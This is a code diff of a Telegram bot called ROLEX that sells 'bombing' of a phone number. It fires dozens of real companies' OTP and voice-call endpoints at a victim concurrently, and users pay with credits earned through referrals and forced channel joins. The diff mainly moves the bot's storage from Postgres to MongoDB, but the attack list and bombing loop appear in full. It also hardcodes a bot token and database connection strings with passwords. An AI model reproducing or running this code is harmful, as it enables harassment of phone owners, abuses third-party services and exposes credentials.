@@ -13,14 +13,16 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 import telebot
 from telebot import types
 import requests
-import psycopg2
-import psycopg2.pool
+from pymongo import MongoClient, ASCENDING
+from pymongo.errors import PyMongoError
 
 # ============= CONFIG =============
 BOT_TOKEN      = os.environ.get("BOT_TOKEN", "8390444092:AAG0e-hqZbbkPs5snI5regEeLpSjA_ChuA4")
 OWNER_ID       = int(os.environ.get("OWNER_ID", "8128821116"))
-ADMIN_IDS      = "8128821116"
-DATABASE_URL   = os.environ.get("DATABASE_URL", " postgresql://postgres:rolex-hosting-panel@db.bkuwfzcfyxwasxccabzs.supabase.co:5432/postgres")
+ADMIN_IDS      = [OWNER_ID]
+
+MONGODB_URI    = os.environ.get("MONGODB_URI", "mongodb+srv://panditadeshdubey2002_db_user:2S72LpODKrGB1DXP@cluster0.ilou0nz.mongodb.net/")
+MONGODB_DB     = os.environ.get("MONGODB_DB", "rolexbomber")
 
 BOMB_DURATION_PER_CREDIT = 300
 DAILY_FREE_CREDITS       = 5
@@ -53,240 +55,168 @@ def _bump(key, n=1):
 def esc(s):
     return html.escape(str(s) if s is not None else "")
 
-# ============= DB (Postgres) =============
-_pool = None
-_pool_lock = threading.Lock()
-
-def _fix_dsn(dsn):
-    """Auto-correct dead Supabase direct hosts to the pooler."""
-    if "db." in dsn and ".supabase.co" in dsn and "pooler" not in dsn:
-        try:
-            # Extract project ref from db.[REF].supabase.co
-            ref_match = re.search(r"db\.([a-z0-9]+)\.supabase\.co", dsn)
-            if ref_match:
-                ref = ref_match.group(1)
-                # Extract password
-                pwd_match = re.search(r":([^:@]+)@", dsn)
-                pwd = pwd_match.group(1) if pwd_match else "password"
-                
-                # Build pooler string (Session mode, port 5432)
-                new_dsn = f"postgresql://postgres.{ref}:{pwd}@aws-0-ap-south-1.pooler.supabase.com:5432/postgres?sslmode=require"
-                print(f"[DB] Auto-fixed dead direct host. Using pooler for project {ref}.")
-                return new_dsn
-        except Exception as e:
-            print(f"[DB] Auto-fix failed, using original: {e}")
-    return dsn
-
-def _get_pool():
-    global _pool
-    if _pool is None:
-        with _pool_lock:
-            if _pool is None:
-                dsn = _fix_dsn(DATABASE_URL)
-                if not dsn.startswith("postgresql://") and not dsn.startswith("postgres://"):
-                    raise RuntimeError("DATABASE_URL must be a postgres URL")
-                
-                # Ensure SSL for Supabase
-                if "supabase" in dsn and "sslmode=" not in dsn:
-                    dsn += ("&" if "?" in dsn else "?") + "sslmode=require"
-
-                _pool = psycopg2.pool.ThreadedConnectionPool(
-                    minconn=1, maxconn=20, dsn=dsn
-                )
-    return _pool
-
-class _Conn:
-    """Pooled connection context manager."""
-    def __enter__(self):
-        self.conn = _get_pool().getconn()
-        return self.conn
-    def __exit__(self, exc_type, exc, tb):
-        try:
-            if exc_type:
-                self.conn.rollback()
-            else:
-                self.conn.commit()
-        finally:
-            _get_pool().putconn(self.conn)
-
-def _exec(sql, params=(), fetch=None):
-    with _Conn() as conn:
-        with conn.cursor() as cur:
-            cur.execute(sql, params)
-            if fetch == "one":
-                return cur.fetchone()
-            if fetch == "all":
-                return cur.fetchall()
-            return cur.rowcount
+# ============= DATABASE (MongoDB) =============
+client = None
+db = None
+users_col = None
+sessions_col = None
+channels_col = None
 
 def init_db():
-    with _Conn() as conn:
-        with conn.cursor() as cur:
-            cur.execute("""
-                CREATE TABLE IF NOT EXISTS users (
-                    user_id         TEXT PRIMARY KEY,
-                    username        TEXT,
-                    credits         INTEGER DEFAULT 5,
-                    total_bombings  INTEGER DEFAULT 0,
-                    referred_by     TEXT,
-                    refer_count     INTEGER DEFAULT 0,
-                    joined_date     TEXT,
-                    last_daily_claim TEXT,
-                    is_banned       INTEGER DEFAULT 0
-                )""")
-            cur.execute("""
-                CREATE TABLE IF NOT EXISTS sessions (
-                    id          SERIAL PRIMARY KEY,
-                    user_id     TEXT,
-                    phone       TEXT,
-                    duration    INTEGER,
-                    credits_used INTEGER,
-                    start_time  TEXT,
-                    status      TEXT DEFAULT 'active'
-                )""")
-            cur.execute("""
-                CREATE TABLE IF NOT EXISTS force_join_channels (
-                    chat_id   TEXT PRIMARY KEY,
-                    name      TEXT,
-                    url       TEXT,
-                    enabled   INTEGER DEFAULT 1,
-                    added_at  TEXT
-                )""")
-            cur.execute("CREATE INDEX IF NOT EXISTS idx_sessions_user ON sessions(user_id)")
-            # seed channels
-            for ch in FORCE_JOIN_CHANNELS:
-                cur.execute("""
-                    INSERT INTO force_join_channels (chat_id, name, url, enabled, added_at)
-                    VALUES (%s,%s,%s,1,%s)
-                    ON CONFLICT (chat_id) DO NOTHING
-                """, (ch["chat_id"], ch["name"], ch["url"], datetime.now().isoformat()))
+    global client, db, users_col, sessions_col, channels_col
+    if not MONGODB_URI:
+        raise RuntimeError("MONGODB_URI env var missing")
+    
+    print("[DB] Connecting to MongoDB...")
+    client = MongoClient(MONGODB_URI, serverSelectionTimeoutMS=5000)
+    db = client[MONGODB_DB]
+    users_col = db["users"]
+    sessions_col = db["sessions"]
+    channels_col = db["channels"]
+    
+    # Ping to verify connection
+    client.admin.command('ping')
+    print("[DB] MongoDB connected.")
 
-def _row_to_user(row):
-    if not row:
-        return None
-    return {
-        "user_id": row[0], "username": row[1], "credits": row[2],
-        "total_bombings": row[3], "referred_by": row[4], "refer_count": row[5],
-        "joined_date": row[6], "last_daily_claim": row[7], "is_banned": row[8]
-    }
+    # Indexes
+    users_col.create_index("user_id", unique=True)
+    sessions_col.create_index("user_id")
+    channels_col.create_index("chat_id", unique=True)
+
+    # Seed channels if empty
+    if channels_col.count_documents({}) == 0:
+        for ch in FORCE_JOIN_CHANNELS:
+            channels_col.insert_one({
+                "chat_id": ch["chat_id"], "name": ch["name"], 
+                "url": ch["url"], "enabled": True,
+                "added_at": datetime.now().isoformat()
+            })
 
 def get_user(user_id):
-    row = _exec(
-        "SELECT user_id,username,credits,total_bombings,referred_by,"
-        "refer_count,joined_date,last_daily_claim,is_banned "
-        "FROM users WHERE user_id=%s",
-        (str(user_id),), fetch="one")
-    return _row_to_user(row)
+    if users_col is None: return None
+    doc = users_col.find_one({"user_id": str(user_id)})
+    if not doc: return None
+    return {
+        "user_id": doc.get("user_id"), "username": doc.get("username"),
+        "credits": doc.get("credits", 0), "total_bombings": doc.get("total_bombings", 0),
+        "referred_by": doc.get("referred_by"), "refer_count": doc.get("refer_count", 0),
+        "joined_date": doc.get("joined_date"), "last_daily_claim": doc.get("last_daily_claim"),
+        "is_banned": doc.get("is_banned", 0)
+    }
 
 def create_user(user_id, username=None, referred_by=None):
     start = DAILY_FREE_CREDITS + (REFERRED_BONUS_CREDITS if referred_by else 0)
-    _exec("""
-        INSERT INTO users (user_id,username,credits,referred_by,joined_date,last_daily_claim)
-        VALUES (%s,%s,%s,%s,%s,%s)
-        ON CONFLICT (user_id) DO NOTHING
-    """, (str(user_id), username, start, referred_by,
-          datetime.now().isoformat(), datetime.now().date().isoformat()))
+    users_col.update_one(
+        {"user_id": str(user_id)},
+        {"$setOnInsert": {
+            "user_id": str(user_id), "username": username,
+            "credits": start, "referred_by": referred_by,
+            "refer_count": 0, "total_bombings": 0,
+            "joined_date": datetime.now().isoformat(),
+            "last_daily_claim": datetime.now().date().isoformat(),
+            "is_banned": 0
+        }},
+        upsert=True
+    )
 
-_ALLOWED = {"username","credits","total_bombings","referred_by",
-            "refer_count","last_daily_claim","is_banned"}
 def update_user(user_id, **kw):
-    keys = {k: v for k, v in kw.items() if k in _ALLOWED}
-    if not keys:
-        return
-    sets = ", ".join(f"{k}=%s" for k in keys)
-    _exec(f"UPDATE users SET {sets} WHERE user_id=%s",
-          (*keys.values(), str(user_id)))
+    allowed = {"username","credits","total_bombings","referred_by",
+               "refer_count","last_daily_claim","is_banned"}
+    keys = {k: v for k, v in kw.items() if k in allowed}
+    if not keys: return
+    users_col.update_one({"user_id": str(user_id)}, {"$set": keys})
 
 def add_credits(uid, n):
-    _exec("UPDATE users SET credits=credits+%s WHERE user_id=%s", (n, str(uid)))
+    users_col.update_one({"user_id": str(uid)}, {"$inc": {"credits": n}})
 
 def sub_credits(uid, n):
-    _exec("UPDATE users SET credits=GREATEST(0, credits-%s) WHERE user_id=%s",
-          (n, str(uid)))
+    # Mongo doesn't have GREATEST, but we fetch, calculate, and set to be safe
+    u = get_user(uid)
+    if u:
+        new_bal = max(0, u["credits"] - n)
+        users_col.update_one({"user_id": str(uid)}, {"$set": {"credits": new_bal}})
 
 def use_credits(uid, n):
-    row = _exec("SELECT credits FROM users WHERE user_id=%s",
-                (str(uid),), fetch="one")
-    if not row or row[0] < n:
-        return False
-    _exec("UPDATE users SET credits=credits-%s WHERE user_id=%s", (n, str(uid)))
+    u = get_user(uid)
+    if not u or u["credits"] < n: return False
+    users_col.update_one({"user_id": str(uid)}, {"$inc": {"credits": -n}})
     return True
 
 def increment_bombings(uid):
-    _exec("UPDATE users SET total_bombings=total_bombings+1 WHERE user_id=%s",
-          (str(uid),))
+    users_col.update_one({"user_id": str(uid)}, {"$inc": {"total_bombings": 1}})
 
 def claim_daily(uid, today):
-    n = _exec("""
-        UPDATE users SET last_daily_claim=%s, credits=credits+%s
-        WHERE user_id=%s AND (last_daily_claim IS NULL OR last_daily_claim<>%s)
-    """, (today, DAILY_FREE_CREDITS, str(uid), today))
-    return n > 0
+    u = get_user(uid)
+    if not u or u.get("last_daily_claim") == today:
+        return False
+    users_col.update_one(
+        {"user_id": str(uid)},
+        {"$set": {"last_daily_claim": today}, "$inc": {"credits": DAILY_FREE_CREDITS}}
+    )
+    return True
 
 def mark_session(phone, uid, status):
     try:
-        _exec("UPDATE sessions SET status=%s "
-              "WHERE user_id=%s AND phone=%s AND status='active'",
-              (status, str(uid), phone))
+        sessions_col.update_many(
+            {"user_id": str(uid), "phone": phone, "status": "active"},
+            {"$set": {"status": status}}
+        )
     except Exception:
         pass
 
 def get_stats_row():
-    users  = _exec("SELECT COUNT(*) FROM users", fetch="one")[0]
-    sess   = _exec("SELECT COUNT(*) FROM sessions", fetch="one")[0]
-    cred   = _exec("SELECT COALESCE(SUM(credits),0) FROM users", fetch="one")[0]
-    banned = _exec("SELECT COUNT(*) FROM users WHERE is_banned=1", fetch="one")[0]
+    users  = users_col.count_documents({})
+    sess   = sessions_col.count_documents({})
+    banned = users_col.count_documents({"is_banned": 1})
+    
+    # Aggregate total credits
+    pipeline = [{"$group": {"_id": None, "total": {"$sum": "$credits"}}}]
+    res = list(users_col.aggregate(pipeline))
+    cred = res[0]["total"] if res else 0
+    
     return {"users": users, "sessions": sess, "credits": cred, "banned": banned}
 
 def sweep_orphans():
     try:
-        _exec("UPDATE sessions SET status='orphaned' WHERE status='active'")
+        sessions_col.update_many({"status": "active"}, {"$set": {"status": "orphaned"}})
     except Exception:
         pass
 
 def get_all_channels(only_enabled=False):
-    q = ("SELECT chat_id,name,url,enabled FROM force_join_channels"
-         + (" WHERE enabled=1" if only_enabled else "")
-         + " ORDER BY added_at ASC")
-    rows = _exec(q, fetch="all")
-    return [{"chat_id": r[0], "name": r[1], "url": r[2], "enabled": bool(r[3])}
-            for r in rows]
+    query = {"enabled": True} if only_enabled else {}
+    rows = list(channels_col.find(query).sort("added_at", ASCENDING))
+    return [{"chat_id": r["chat_id"], "name": r["name"], "url": r["url"], 
+             "enabled": bool(r.get("enabled", 1))} for r in rows]
 
 def add_channel(chat_id, name, url):
     try:
-        _exec("""INSERT INTO force_join_channels
-                 (chat_id,name,url,enabled,added_at)
-                 VALUES (%s,%s,%s,1,%s)""",
-              (chat_id, name, url, datetime.now().isoformat()))
+        channels_col.insert_one({
+            "chat_id": chat_id, "name": name, "url": url,
+            "enabled": True, "added_at": datetime.now().isoformat()
+        })
         return True
-    except psycopg2.IntegrityError:
-        return False
-    except Exception as e:
-        print(f"add_channel error: {e}")
+    except PyMongoError:
         return False
 
 def remove_channel(chat_id):
-    n = _exec("DELETE FROM force_join_channels WHERE chat_id=%s", (chat_id,))
-    return n > 0
+    r = channels_col.delete_one({"chat_id": chat_id})
+    return r.deleted_count > 0
 
 def toggle_channel(chat_id):
-    _exec("UPDATE force_join_channels SET enabled=1-enabled WHERE chat_id=%s",
-          (chat_id,))
-    row = _exec("SELECT enabled FROM force_join_channels WHERE chat_id=%s",
-                (chat_id,), fetch="one")
-    return bool(row[0]) if row else None
+    doc = channels_col.find_one({"chat_id": chat_id})
+    if not doc: return None
+    new_state = not doc.get("enabled", True)
+    channels_col.update_one({"chat_id": chat_id}, {"$set": {"enabled": new_state}})
+    return new_state
 
 # ============= BOMBER APIS =============
 BOMBER_APIS = [
-    # -- generic re-post workers --
     {"name":"bombom","method":"GET",
      "url_generator": lambda p: f"https://bombom.hb3284008.workers.dev/?mobile={p}",
      "headers":{"User-Agent":"Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"}},
     {"name":"darkseid","method":"GET",
      "url_generator": lambda p: f"https://darkseid.kylohost.com/api/bomb.php?number={p}&key=papa-x",
      "headers":{"User-Agent":"Mozilla/5.0"}},
-
-    # -- real OTP providers we've seen --
     {"name":"TataCapital_Call","method":"POST",
      "url_generator": lambda p: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
      "headers":{"Content-Type":"application/json"},
@@ -364,7 +294,6 @@ BOMBER_APIS = [
      "json_body": lambda p: {"phoneNumber": f"91{p}", "authMethod":"call", "token":""}},
 ]
 
-# classx.co.in farm — these actually resolve as wildcard subdomains
 _CLASSX_DOMAINS = [
     "a4agricosapi","a4shubapi","aacharyaayurvedaapi","aadarshonlineeducationapi",
     "aadharclassesjhunjhunuapi","aadiwasikritisamitiapi","aagaazinstitutionapi",
@@ -399,11 +328,9 @@ print(f"[BOOT] Loaded {len(BOMBER_APIS)} APIs")
 
 # ============= FORCE JOIN =============
 def is_user_joined(user_id):
-    if not FORCE_JOIN_ENABLED:
-        return True
+    if not FORCE_JOIN_ENABLED: return True
     chans = get_all_channels(only_enabled=True)
-    if not chans:
-        return True
+    if not chans: return True
     for ch in chans:
         try:
             m = bot.get_chat_member(ch["chat_id"], user_id)
@@ -416,15 +343,13 @@ def is_user_joined(user_id):
                                        "member list is inaccessible")):
                 continue
             print(f"force-join fail {ch['chat_id']}: {e}")
-            continue
     return True
 
 def force_join_keyboard():
     kb = types.InlineKeyboardMarkup(row_width=1)
     for ch in get_all_channels(only_enabled=True):
         kb.add(types.InlineKeyboardButton(f"📢 Join {ch['name']}", url=ch["url"]))
-    kb.add(types.InlineKeyboardButton("✅ I've Joined — Verify",
-                                      callback_data="verify_join"))
+    kb.add(types.InlineKeyboardButton("✅ I've Joined — Verify", callback_data="verify_join"))
     return kb
 
 def force_join_message():
@@ -547,8 +472,7 @@ def hit_bomber_api(cfg, phone):
 def _hit_one(cfg, phone):
     ok = hit_bomber_api(cfg, phone)
     _bump("api_hits")
-    if ok:
-        _bump("api_success")
+    if ok: _bump("api_success")
     return ok
 
 def run_bombing(uid, phone, duration, chat_id, status_mid):
@@ -564,13 +488,10 @@ def run_bombing(uid, phone, duration, chat_id, status_mid):
                     break
                 futures = [ex.submit(_hit_one, api, phone) for api in BOMBER_APIS]
                 for f in as_completed(futures):
-                    try:
-                        ok = f.result()
-                    except Exception:
-                        ok = False
+                    try: ok = f.result()
+                    except Exception: ok = False
                     total += 1
-                    if ok:
-                        succ += 1
+                    if ok: succ += 1
                 now = time.time()
                 if now - last_edit >= 1.2:
                     last_edit = now
@@ -581,8 +502,7 @@ def run_bombing(uid, phone, duration, chat_id, status_mid):
                     bar = "█"*fill + "░"*(20-fill)
                     rate = total / max(1, el)
                     k = types.InlineKeyboardMarkup()
-                    k.add(types.InlineKeyboardButton("🛑 STOP BOMBING",
-                                                     callback_data="stop_my_bombing"))
+                    k.add(types.InlineKeyboardButton("🛑 STOP BOMBING", callback_data="stop_my_bombing"))
                     try:
                         bot.edit_message_text(
                             f"🚀 <b>Live Bombing</b>\n\n"
@@ -594,8 +514,7 @@ def run_bombing(uid, phone, duration, chat_id, status_mid):
                             f"⚡ <code>{rate:.1f} hits/s</code>\n\n"
                             f"━━━━━━━━━━━━━━━━━━━━\n⌚ <b>ROLEX</b>",
                             chat_id, status_mid, reply_markup=k)
-                    except Exception:
-                        pass
+                    except Exception: pass
                 time.sleep(CYCLE_GAP)
     except Exception as e:
         print(f"bombing error: {e}")
@@ -613,13 +532,10 @@ def run_bombing(uid, phone, duration, chat_id, status_mid):
             f"✅ <code>{succ}</code>\n"
             f"⚡ <code>{total/max(1,el):.1f} hits/s</code>\n\n"
             f"━━━━━━━━━━━━━━━━━━━━\n⌚ <b>ROLEX</b>")
-    try:
-        bot.edit_message_text(text, chat_id, status_mid, reply_markup=k)
+    try: bot.edit_message_text(text, chat_id, status_mid, reply_markup=k)
     except Exception:
-        try:
-            bot.send_message(chat_id, text, reply_markup=k)
-        except Exception:
-            pass
+        try: bot.send_message(chat_id, text, reply_markup=k)
+        except Exception: pass
     mark_session(phone, uid, "stopped" if stopped else "completed")
     with _bomb_lock:
         active_bombings.pop(key, None)
@@ -633,8 +549,7 @@ def _start_health_server():
             self.send_header("Content-Type", "text/plain")
             self.end_headers()
             self.wfile.write(b"ok")
-        def log_message(self, *a):
-            pass
+        def log_message(self, *a): pass
     def run():
         with socketserver.TCPServer(("0.0.0.0", port), H) as s:
             s.serve_forever()
@@ -642,14 +557,11 @@ def _start_health_server():
 
 def _keepalive():
     url = os.environ.get("RENDER_EXTERNAL_URL")
-    if not url:
-        return
+    if not url: return
     while True:
         time.sleep(600)
-        try:
-            requests.get(url.rstrip("/") + "/health", timeout=10)
-        except Exception:
-            pass
+        try: requests.get(url.rstrip("/") + "/health", timeout=10)
+        except Exception: pass
 
 # ============= START =============
 @bot.message_handler(commands=['start','menu'])
@@ -677,16 +589,14 @@ def start_handler(message):
         if referred_by:
             add_credits(referred_by, REFER_BONUS_CREDITS)
             r = get_user(referred_by)
-            if r:
-                update_user(referred_by, refer_count=r["refer_count"] + 1)
+            if r: update_user(referred_by, refer_count=r["refer_count"] + 1)
             try:
                 bot.send_message(int(referred_by),
                     f"🎉 <b>Referral Bonus!</b>\n\n"
                     f"@{esc(username)} ne aapka link use kiya!\n"
                     f"💰 +{REFER_BONUS_CREDITS} credits!\n\n⌚ <b>ROLEX</b>",
                     reply_markup=back_keyboard())
-            except Exception:
-                pass
+            except Exception: pass
     else:
         update_user(uid, username=username)
 
@@ -764,10 +674,11 @@ def use_credits_handler(call):
     duration = credits * BOMB_DURATION_PER_CREDIT
     try:
         increment_bombings(uid)
-        _exec("""INSERT INTO sessions
-                 (user_id,phone,duration,credits_used,start_time)
-                 VALUES (%s,%s,%s,%s,%s)""",
-              (str(uid), phone, duration, credits, datetime.now().isoformat()))
+        sessions_col.insert_one({
+            "user_id": str(uid), "phone": phone, "duration": duration,
+            "credits_used": credits, "start_time": datetime.now().isoformat(),
+            "status": "active"
+        })
         try:
             bot.edit_message_text(
                 f"🚀 <b>Started!</b>\n\n"
@@ -794,25 +705,21 @@ def use_credits_handler(call):
 
 # ============= BROADCAST =============
 def _do_broadcast(chat_id, text, status_mid=None):
-    rows = _exec("SELECT user_id FROM users WHERE is_banned=0", fetch="all")
-    targets = [r[0] for r in rows]
+    targets = [r["user_id"] for r in users_col.find({"is_banned": 0})]
     ok = fail = 0
     for u in targets:
         try:
-            bot.send_message(int(u),
-                f"📢 <b>Announcement</b>\n\n{text}\n\n⌚ <b>ROLEX</b>")
+            bot.send_message(int(u), f"📢 <b>Announcement</b>\n\n{text}\n\n⌚ <b>ROLEX</b>")
             ok += 1
             time.sleep(0.05)
-        except Exception:
-            fail += 1
+        except Exception: fail += 1
     result = (f"✅ <b>Broadcast Done</b>\n\n"
               f"Sent: <code>{ok}</code>\n"
               f"Failed: <code>{fail}</code>\n"
               f"Total: <code>{len(targets)}</code>")
     if status_mid:
         try:
-            bot.edit_message_text(result, chat_id, status_mid,
-                                  reply_markup=admin_keyboard())
+            bot.edit_message_text(result, chat_id, status_mid, reply_markup=admin_keyboard())
             return
         except Exception: pass
     try: bot.send_message(chat_id, result)
@@ -841,8 +748,7 @@ def callback_handler(call):
         try: bot.answer_callback_query(call.id, "🔒 Join required.", show_alert=True)
         except Exception: pass
         try:
-            bot.send_message(chat_id, force_join_message(),
-                             reply_markup=force_join_keyboard())
+            bot.send_message(chat_id, force_join_message(), reply_markup=force_join_keyboard())
         except Exception: pass
         return
     PERSIST = {"adm_awaiting_channel","adm_awaiting_uid","adm_awaiting_broadcast",
@@ -855,13 +761,10 @@ def callback_handler(call):
         if is_user_joined(uid):
             try: bot.answer_callback_query(call.id, "✅ Verified. /start", show_alert=True)
             except Exception: pass
-            try:
-                bot.edit_message_text("✅ <b>Verified!</b>\n\nAb /start bhejein.",
-                                      chat_id, mid)
+            try: bot.edit_message_text("✅ <b>Verified!</b>\n\nAb /start bhejein.", chat_id, mid)
             except Exception: pass
         else:
-            try: bot.answer_callback_query(call.id,
-                "❌ Abhi bhi join nahi kiya.", show_alert=True)
+            try: bot.answer_callback_query(call.id, "❌ Abhi bhi join nahi kiya.", show_alert=True)
             except Exception: pass
 
     elif data == "main_menu":
@@ -909,8 +812,7 @@ def callback_handler(call):
                 f"⏱ 1 credit = 5 min\n\n<i>/cancel to abort</i>",
                 chat_id, mid, reply_markup=back_keyboard())
         except Exception:
-            try:
-                bot.send_message(chat_id, "📱 Send 10-digit number. /cancel to abort.",
+            try: bot.send_message(chat_id, "📱 Send 10-digit number. /cancel to abort.",
                                  reply_markup=back_keyboard())
             except Exception: pass
 
@@ -918,10 +820,8 @@ def callback_handler(call):
         try: bot.answer_callback_query(call.id)
         except Exception: pass
         daily = user["last_daily_claim"] == datetime.now().date().isoformat()
-        try:
-            j = datetime.fromisoformat(user["joined_date"]).strftime("%Y-%m-%d")
-        except Exception:
-            j = "N/A"
+        try: j = datetime.fromisoformat(user["joined_date"]).strftime("%Y-%m-%d")
+        except Exception: j = "N/A"
         t = (f"👤 <b>My Profile</b>\n\n"
              f"🆔 <code>{esc(user['user_id'])}</code>\n"
              f"👤 @{esc(user['username'] or 'N/A')}\n"
@@ -939,14 +839,20 @@ def callback_handler(call):
     elif data == "my_stats":
         try: bot.answer_callback_query(call.id)
         except Exception: pass
-        row = _exec("SELECT COUNT(*), COALESCE(SUM(credits_used),0), "
-                    "COALESCE(SUM(duration),0) FROM sessions WHERE user_id=%s",
-                    (str(uid),), fetch="one")
+        total_sess = sessions_col.count_documents({"user_id": str(uid)})
+        # Aggregate total credits and duration for this user
+        pipeline = [{"$match": {"user_id": str(uid)}}, {"$group": {
+            "_id": None, "sum_cred": {"$sum": "$credits_used"}, "sum_dur": {"$sum": "$duration"}
+        }}]
+        res = list(sessions_col.aggregate(pipeline))
+        sum_cred = res[0]["sum_cred"] if res else 0
+        sum_dur = res[0]["sum_dur"] if res else 0
+        
         t = (f"📊 <b>My Stats</b>\n\n"
              f"💣 <code>{user['total_bombings']}</code>\n"
-             f"📁 <code>{row[0]}</code>\n"
-             f"💰 <code>{row[1]}</code>\n"
-             f"⏱ <code>{row[2]//60} min</code>\n"
+             f"📁 <code>{total_sess}</code>\n"
+             f"💰 <code>{sum_cred}</code>\n"
+             f"⏱ <code>{sum_dur//60} min</code>\n"
              f"👥 <code>{user['refer_count']}</code>\n"
              f"💳 <code>{user['credits']}</code>\n\n"
              f"━━━━━━━━━━━━━━━━━━━━\n⌚ <b>ROLEX</b>")
@@ -983,8 +889,7 @@ def callback_handler(call):
             try: bot.answer_callback_query(call.id, "⏰ Already claimed.", show_alert=True)
             except Exception: pass
             return
-        try: bot.answer_callback_query(call.id,
-            f"🎉 +{DAILY_FREE_CREDITS} credits!", show_alert=True)
+        try: bot.answer_callback_query(call.id, f"🎉 +{DAILY_FREE_CREDITS} credits!", show_alert=True)
         except Exception: pass
         nu = get_user(uid)
         try:
@@ -1014,8 +919,7 @@ def callback_handler(call):
             try: bot.answer_callback_query(call.id, "🛑 Stopping...", show_alert=True)
             except Exception: pass
             try:
-                bot.edit_message_text("🛑 <b>Stop requested.</b>",
-                                      chat_id, mid, reply_markup=back_keyboard())
+                bot.edit_message_text("🛑 <b>Stop requested.</b>", chat_id, mid, reply_markup=back_keyboard())
             except Exception: pass
         else:
             try: bot.answer_callback_query(call.id, "❌ None active.", show_alert=True)
@@ -1058,18 +962,14 @@ def callback_handler(call):
         if uid not in ADMIN_IDS: return
         try: bot.answer_callback_query(call.id)
         except Exception: pass
-        try:
-            bot.edit_message_text("💰 <b>Credit Manager</b>", chat_id, mid,
-                                  reply_markup=admin_credits_keyboard())
+        try: bot.edit_message_text("💰 <b>Credit Manager</b>", chat_id, mid, reply_markup=admin_credits_keyboard())
         except Exception: pass
 
     elif data == "adm_ban":
         if uid not in ADMIN_IDS: return
         try: bot.answer_callback_query(call.id)
         except Exception: pass
-        try:
-            bot.edit_message_text("🚫 <b>Ban Manager</b>", chat_id, mid,
-                                  reply_markup=admin_ban_keyboard())
+        try: bot.edit_message_text("🚫 <b>Ban Manager</b>", chat_id, mid, reply_markup=admin_ban_keyboard())
         except Exception: pass
 
     elif data == "adm_add_credits":
@@ -1077,9 +977,7 @@ def callback_handler(call):
         user_states[uid] = "adm_add_credits"
         try: bot.answer_callback_query(call.id)
         except Exception: pass
-        try:
-            bot.edit_message_text("➕ <b>Add Credits</b>\n\nSend <code>USER_ID AMOUNT</code>",
-                                  chat_id, mid, reply_markup=admin_credits_keyboard())
+        try: bot.edit_message_text("➕ <b>Add Credits</b>\n\nSend <code>USER_ID AMOUNT</code>", chat_id, mid, reply_markup=admin_credits_keyboard())
         except Exception: pass
 
     elif data == "adm_remove_credits":
@@ -1087,9 +985,7 @@ def callback_handler(call):
         user_states[uid] = "adm_remove_credits"
         try: bot.answer_callback_query(call.id)
         except Exception: pass
-        try:
-            bot.edit_message_text("➖ <b>Remove Credits</b>\n\nSend <code>USER_ID AMOUNT</code>",
-                                  chat_id, mid, reply_markup=admin_credits_keyboard())
+        try: bot.edit_message_text("➖ <b>Remove Credits</b>\n\nSend <code>USER_ID AMOUNT</code>", chat_id, mid, reply_markup=admin_credits_keyboard())
         except Exception: pass
 
     elif data == "adm_reset_credits":
@@ -1097,9 +993,7 @@ def callback_handler(call):
         user_states[uid] = "adm_reset_credits"
         try: bot.answer_callback_query(call.id)
         except Exception: pass
-        try:
-            bot.edit_message_text("🔄 <b>Reset Credits</b>\n\nSend USER_ID",
-                                  chat_id, mid, reply_markup=admin_credits_keyboard())
+        try: bot.edit_message_text("🔄 <b>Reset Credits</b>\n\nSend USER_ID", chat_id, mid, reply_markup=admin_credits_keyboard())
         except Exception: pass
 
     elif data == "adm_ban_user":
@@ -1107,9 +1001,7 @@ def callback_handler(call):
         user_states[uid] = "adm_ban_user"
         try: bot.answer_callback_query(call.id)
         except Exception: pass
-        try:
-            bot.edit_message_text("🚫 <b>Ban User</b>\n\nSend USER_ID",
-                                  chat_id, mid, reply_markup=admin_ban_keyboard())
+        try: bot.edit_message_text("🚫 <b>Ban User</b>\n\nSend USER_ID", chat_id, mid, reply_markup=admin_ban_keyboard())
         except Exception: pass
 
     elif data == "adm_unban_user":
@@ -1117,9 +1009,7 @@ def callback_handler(call):
         user_states[uid] = "adm_unban_user"
         try: bot.answer_callback_query(call.id)
         except Exception: pass
-        try:
-            bot.edit_message_text("✅ <b>Unban User</b>\n\nSend USER_ID",
-                                  chat_id, mid, reply_markup=admin_ban_keyboard())
+        try: bot.edit_message_text("✅ <b>Unban User</b>\n\nSend USER_ID", chat_id, mid, reply_markup=admin_ban_keyboard())
         except Exception: pass
 
     elif data == "adm_status":
@@ -1173,8 +1063,7 @@ def callback_handler(call):
              f"Enabled: <code>{sum(1 for c in chans if c['enabled'])}</code>\n"
              f"Global: <b>{'ON' if FORCE_JOIN_ENABLED else 'OFF'}</b>\n\n"
              f"Tap to toggle.")
-        try: bot.edit_message_text(t, chat_id, mid,
-                                   reply_markup=channel_manager_keyboard())
+        try: bot.edit_message_text(t, chat_id, mid, reply_markup=channel_manager_keyboard())
         except Exception:
             try: bot.send_message(chat_id, t, reply_markup=channel_manager_keyboard())
             except Exception: pass
@@ -1197,9 +1086,7 @@ def callback_handler(call):
         if uid not in ADMIN_IDS: return
         try: bot.answer_callback_query(call.id)
         except Exception: pass
-        try:
-            bot.edit_message_text("❌ <b>Remove Channel</b>", chat_id, mid,
-                                  reply_markup=channel_remove_keyboard())
+        try: bot.edit_message_text("❌ <b>Remove Channel</b>", chat_id, mid, reply_markup=channel_remove_keyboard())
         except Exception: pass
 
     elif data.startswith("adm_ch_toggle_"):
@@ -1210,16 +1097,14 @@ def callback_handler(call):
             try: bot.answer_callback_query(call.id, "❌ Not found.", show_alert=True)
             except Exception: pass
         else:
-            try: bot.answer_callback_query(call.id,
-                f"{'🟢 Enabled' if ns else '🔴 Disabled'}")
+            try: bot.answer_callback_query(call.id, f"{'🟢 Enabled' if ns else '🔴 Disabled'}")
             except Exception: pass
         chans = get_all_channels()
         t = (f"🔒 <b>Force-Join Manager</b>\n\n"
              f"Total: <code>{len(chans)}</code>\n"
              f"Enabled: <code>{sum(1 for c in chans if c['enabled'])}</code>\n\n"
              f"Tap to toggle.")
-        try: bot.edit_message_text(t, chat_id, mid,
-                                   reply_markup=channel_manager_keyboard())
+        try: bot.edit_message_text(t, chat_id, mid, reply_markup=channel_manager_keyboard())
         except Exception: pass
 
     elif data.startswith("adm_ch_remove_"):
@@ -1231,9 +1116,7 @@ def callback_handler(call):
         else:
             try: bot.answer_callback_query(call.id, "❌ Not found.", show_alert=True)
             except Exception: pass
-        try:
